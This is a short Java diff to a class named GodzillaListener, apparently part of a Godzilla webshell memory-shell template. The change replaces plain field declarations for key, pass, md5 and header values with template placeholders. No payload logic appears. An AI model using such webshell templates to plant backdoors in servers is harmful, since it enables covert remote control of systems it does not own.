@@ -14,11 +14,11 @@ import java.lang.reflect.Field;
  * @author ReaJason
  */
 public class GodzillaListener extends ClassLoader implements ServletRequestListener {
-    public String md5;
-    public String pass;
-    public String key;
-    public String headerName;
-    public String headerValue;
+    public String key = "{{key}}";
+    public String pass = "{{pass}}";
+    public String md5 = "{{md5}}";
+    public String headerName = "{{headerName}}";
+    public String headerValue = "{{headerValue}}";
 
     public GodzillaListener() {
     }
